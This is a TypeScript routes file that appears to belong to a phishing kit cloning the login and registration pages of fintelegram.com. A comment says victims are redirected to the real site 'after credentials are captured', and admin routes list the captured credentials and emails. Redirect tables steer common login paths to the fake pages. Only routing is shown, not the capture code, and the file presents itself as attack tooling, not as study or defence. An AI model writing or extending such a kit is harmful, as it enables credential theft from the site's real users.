export const ROUTES = {
  home: "/",
  frontPage: "/front-page",
  pmsLogin: "/pms-login",
  pmsRegister: "/pms-register",
  wpLogin: "/wp-login.php",
  wpAdmin: "/wp-admin",
  wpAdminCredentials: "/wp-admin/credentials",
  wpAdminEmails: "/wp-admin/emails",
} as const;

/** Real fintelegram.com URLs — redirect here after credentials are captured. */
export const REAL_SITE_URLS = {
  pmsLogin: "https://fintelegram.com/pms-login/",
  pmsRegister: "https://fintelegram.com/pms-register/",
  wpLogin: "https://fintelegram.com/wp-login.php",
} as const;

export const LEGACY_REDIRECTS: Record<string, string> = {
  "/login": ROUTES.pmsLogin,
  "/login/": ROUTES.pmsLogin,
  "/register": ROUTES.pmsRegister,
  "/register/": ROUTES.pmsRegister,
  "/wp-login": ROUTES.wpLogin,
  "/wp-login/": ROUTES.wpLogin,
  "/home": ROUTES.home,
  "/home/": ROUTES.home,
  "/admin": ROUTES.wpAdminCredentials,
  "/admin/": ROUTES.wpAdminCredentials,
  "/admin/login": ROUTES.wpLogin,
  "/admin/login/": ROUTES.wpLogin,
  "/admin/credentials": ROUTES.wpAdminCredentials,
  "/admin/credentials/": ROUTES.wpAdminCredentials,
  "/admin/emails": ROUTES.wpAdminEmails,
  "/admin/emails/": ROUTES.wpAdminEmails,
};
